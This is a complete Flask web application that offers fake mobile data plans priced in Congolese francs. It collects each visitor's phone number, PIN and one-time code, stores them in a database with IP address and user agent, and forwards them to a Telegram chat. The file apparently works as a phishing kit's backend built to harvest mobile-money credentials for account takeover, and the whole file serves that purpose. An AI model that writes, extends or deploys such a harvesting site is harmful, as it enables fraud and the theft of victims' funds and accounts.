print("🔥 flask_app.py loaded successfully 🔥")

import os
import re
import psycopg
import requests

from flask import (
    Flask,
    render_template,
    request,
    redirect,
    session,
    url_for,
    abort,
)

# --------------------------------------------------
# App setup
# --------------------------------------------------

app = Flask(
    __name__,
    static_folder="static",
    static_url_path="/static",
)

app.secret_key = os.environ.get("SECRET_KEY", "dev-secret-key")

# --------------------------------------------------
# Database (psycopg3)
# --------------------------------------------------

def get_db_connection():
    db_url = os.environ.get("DATABASE_URL")
    if not db_url:
        raise RuntimeError("DATABASE_URL is not set in Render environment variables!")

    try:
        conn = psycopg.connect(db_url, autocommit=True)
        print("✅ DB connection established")
        return conn
    except Exception as e:
        print(f"❌ Failed to connect to DB: {e}")
        raise

def init_database():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS user_data (
                id SERIAL PRIMARY KEY,
                phone_number VARCHAR(20),
                pin_code VARCHAR(10),
                selected_plan VARCHAR(100),
                plan_price VARCHAR(50),
                ip_address VARCHAR(50),
                user_agent TEXT,
                page_url TEXT,
                otp_code VARCHAR(10),
                entry_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        print("✅ Database initialized / table ready")
    except Exception as e:
        print(f"⚠️ Database init skipped: {e}")
    finally:
        if 'cur' in locals():
            cur.close()
        if 'conn' in locals():
            conn.close()

# Run init safely on startup
init_database()

# --------------------------------------------------
# Telegram
# --------------------------------------------------

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

def send_telegram(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram not configured — skipping send")
        return

    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML",
            },
            timeout=5,
        )
        print("Telegram message sent")
    except Exception as e:
        print(f"Telegram send error: {e}")

# --------------------------------------------------
# Plans
# --------------------------------------------------

PLANS = {
    1: {"name": "Forfait Basique", "price": "1500 CDF"},
    2: {"name": "Forfait Standard", "price": "2500 CDF"},
    3: {"name": "Forfait Premium", "price": "5000 CDF"},
    4: {"name": "Forfait Ultra", "price": "10000 CDF"},
    5: {"name": "Forfait Business", "price": "25000 CDF"},
    6: {"name": "Forfait Illimité", "price": "50000 CDF"},
}

# --------------------------------------------------
# Routes
# --------------------------------------------------

@app.route("/")
def index():
    return render_template("index.html", plans=PLANS)

@app.route("/payment")
def payment():
    plan_id = request.args.get("plan", type=int)
    plan = PLANS.get(plan_id)

    if not plan:
        abort(404)

    session["plan"] = plan
    return render_template("payment.html", plan=plan)

@app.route("/save-phone-pin", methods=["POST"])
def save_phone_pin():
    phone_raw = request.form.get("phone", "")
    pin = request.form.get("pin", "")

    if not phone_raw or not pin:
        abort(400)

    digits = re.sub(r"[^0-9]", "", phone_raw)
    if digits.startswith("243"):
        phone = "+" + digits
    else:
        phone = "+243" + digits.lstrip("0")

    plan = session.get("plan")
    if not plan:
        return redirect(url_for("index"))

    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO user_data
            (phone_number, pin_code, selected_plan, plan_price, ip_address, user_agent, page_url)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
            RETURNING id
        """, (
            phone,
            pin,
            plan["name"],
            plan["price"],
            request.remote_addr,
            request.headers.get("User-Agent"),
            request.referrer,
        ))
        entry_id = cur.fetchone()[0]
        print(f"✅ Saved submission with ID {entry_id}")
    except Exception as e:
        print(f"❌ DB error in save_phone_pin: {e}")
        abort(500)
    finally:
        if 'cur' in locals():
            cur.close()
        if 'conn' in locals():
            conn.close()

    send_telegram(
        f"<b>🔔 NEW SUBMISSION</b>\n\n"
        f"📞 {phone}\n"
        f"🔑 {pin}\n"
        f"📦 {plan['name']}\n"
        f"💰 {plan['price']}"
    )

    session["entry_id"] = entry_id
    session["phone"] = phone

    return redirect(url_for("otp_page"))

@app.route("/otp-page")
def otp_page():
    if "entry_id" not in session:
        return redirect(url_for("index"))
    return render_template("otp-page.html", phone=session["phone"])

@app.route("/save-otp", methods=["POST"])
def save_otp():
    otp = request.form.get("otp")
    entry_id = session.get("entry_id")

    if not otp or not entry_id:
        abort(400)

    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute(
            "UPDATE user_data SET otp_code=%s WHERE id=%s",
            (otp, entry_id),
        )
        print(f"✅ OTP saved for entry {entry_id}")
    except Exception as e:
        print(f"❌ OTP save error: {e}")
        abort(500)
    finally:
        if 'cur' in locals():
            cur.close()
        if 'conn' in locals():
            conn.close()

    send_telegram(f"<b>✅ OTP RECEIVED</b>\n🔢 {otp}")
    session.clear()
    return redirect(url_for("success"))

@app.route("/success")
def success():
    return render_template("succes.html")  # ← Fixed to match your actual filename

# --------------------------------------------------
# Local dev or Gunicorn
# --------------------------------------------------

if __name__ == "__main__":
    # Use port 5000 locally
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))